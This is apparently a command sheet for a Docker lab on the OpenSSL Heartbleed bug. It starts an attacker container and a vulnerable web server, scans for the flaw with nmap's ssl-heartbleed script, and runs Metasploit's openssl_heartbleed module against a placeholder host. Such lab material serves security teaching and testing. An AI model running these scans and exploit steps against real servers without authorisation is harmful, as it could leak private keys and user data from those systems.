# Start the attacker container image
docker compose run attacker bash
# Or
docker-compose run attacker bash

# Start web server
docker-compose up -d web-server


# Scan heartbleed vulnerability from the attacker container
nmap -sV -p 443 --script=ssl-heartbleed web-server
nmap -sV -p 443 --script=ssl-heartbleed IP-adder-of-web-server

# Scan from local machine not container
sudo nmap -sV -p 8443 --script=ssl-heartbleed 127.0.0.1



msfconsole -q

use auxiliary/scanner/ssl/openssl_heartbleed

set RHOSTS <site-ip>

set VERBOSE true

exploit